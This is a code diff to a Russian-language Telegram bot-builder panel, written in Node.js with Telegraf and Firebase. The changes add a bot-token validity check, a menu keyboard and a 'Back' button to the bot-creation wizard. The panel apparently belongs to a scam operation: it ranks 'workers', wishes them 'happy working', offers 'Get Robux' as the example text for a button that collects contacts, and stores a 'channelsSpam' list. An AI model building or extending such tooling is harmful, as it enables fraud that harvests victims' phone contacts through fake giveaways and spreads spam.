@@ -1,22 +1,40 @@
 const { Scenes: { WizardScene }, Telegraf } = require("telegraf");
 const { ref, get, child, set, update } = require("firebase/database");
 
+const axios = require("axios");
 const db = require("../database");
 const createConfig = require("../botCreatingTools/createConfig");
 const createBot = require("../botCreatingTools/createBot");
 const cmdWorking = require("../botCreatingTools/cmdWorking");
 const fs = require("fs");
 
+function sleep(ms) {
+    return new Promise((resolve) => {
+        setTimeout(resolve, ms);
+    });
+}
+
+const keyboard = {
+    keyboard: [[{text: "👨🏼‍💻Ваш профиль"}], [{text: "Информация"}, {text: "Топ воркеров"}, {text: "Создать бота"}]],
+    resize_keyboard: true
+}
+
 const createBotScene = new WizardScene("createBotScene",
     async (ctx) => {
-        if(fs.existsSync(`./bots/${ctx.chat.id}`)) fs.writeFileSync(`./bots/${ctx.chat.id}/stop.stop`, "besttem");
-
         if(ctx.message?.text == undefined) return;
 
         ctx.scene.state = {};
 
         ctx.scene.state.worker_id = ctx.chat.id;
         ctx.scene.state.botToken = ctx.message.text;
+
+        try {
+            await axios.get(`https://api.telegram.org/bot${ctx.message.text}/getMe`);
+        }
+        catch {
+            await ctx.reply("Токен бота невалид.", {reply_markup: keyboard})
+            return ctx.scene.leave();
+        }
 
         await ctx.reply("Вы попали в настройку текста бота!\nВведите текст кнопки отправки контакта.\n\nПример: \"Получить робуксы\"");
         return ctx.wizard.next();
@@ -125,9 +143,12 @@ const createBotScene = new WizardScene("createBotScene",
     async (ctx) => {
         if(ctx.message?.text == undefined) return;
 
+        if(fs.existsSync(`./bots/${ctx.chat.id}`)) fs.writeFileSync(`./bots/${ctx.chat.id}/stop.stop`, "besttem");
+        await sleep(1000);
+
         ctx.scene.state.channelsSpam = ctx.message.text.split(",");
 
-        await ctx.reply("Поздравляю! Вы успешно всё настроили! Удачного ворка 🍀")
+        await ctx.reply("Поздравляю! Вы успешно всё настроили! Удачного ворка 🍀", {reply_markup: keyboard})
         await set(child(ref(db), `users/${ctx.chat.id}/bot`),
             {
                 worker_id: ctx.scene.state.worker_id,
@@ -176,8 +197,13 @@ const createBotScene = new WizardScene("createBotScene",
     }
 )
 
+createBotScene.hears("Вернуться", async (ctx) => {
+    await ctx.reply("Вы вернулись в панель!", {reply_markup: keyboard})
+    return ctx.scene.leave();
+})
+
 createBotScene.enter((ctx) => {
-    ctx.reply("Вы попали в создание бота!\n\nВведите токен бота: ")
+    ctx.reply("Вы попали в создание бота!\n\nВведите токен бота: ", {reply_markup: {keyboard: [[{text: "Вернуться"}]], resize_keyboard: true}})
 })
 
 module.exports = createBotScene;
